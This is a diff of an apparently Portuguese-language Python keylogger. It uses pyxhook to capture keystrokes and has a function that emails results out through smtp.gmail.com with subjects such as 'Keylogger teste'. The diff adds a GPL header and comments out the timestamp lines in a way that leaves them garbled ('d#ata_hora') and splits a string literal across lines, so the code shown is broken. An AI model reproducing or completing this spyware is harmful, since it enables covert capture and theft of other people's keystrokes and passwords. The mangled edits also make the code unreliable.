@@ -1,3 +1,19 @@
+
+#Copyright (C) 2008 MrTrue <gui15787@gmail.com>
+#     This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with this program.  If not, see <https://www.gnu.org/licenses/>
+
+
 #lib importantes
 #-*- coding: utf-8 -*-
 import pyxhook
@@ -44,13 +60,15 @@ def envia_email(servidor, porta, FROM, PASS, TO, subject, texto, anexo=[""]):
   except Exception,e:
     errorMsg = "Nao Foi Possivel Enviar o Email.\n Error: %s" % str(e)
     print('%s'%errorMsg)
+#
+d#ata_hora = datetime.datetime.now()
+d#ata_hora = str(data_hora).split('.')[0].replace(' ','_')###
+#
+#destinatario = '' #para onde você ira enviar o arquivo
+#assunto = 'Keylogger teste %s' %data_hora
+mensagem = 'teste do meu Keylogger 
 
-data_hora = datetime.datetime.now()
-data_hora = str(data_hora).split('.')[0].replace(' ','_')
-
-destinatario = '' #para onde você ira enviar o arquivo
-assunto = 'Keylogger teste %s' %data_hora
-mensagem = 'teste do meu Keylogger %s'%data_hora #mensagem é também pega a data é a hora do pc 
+%s'%data_hora #mensagem é também pega a data é a hora do pc 
 
 servidor= 'smtp.gmail.com' #o servidor pode ser do gmail dentre outros
 
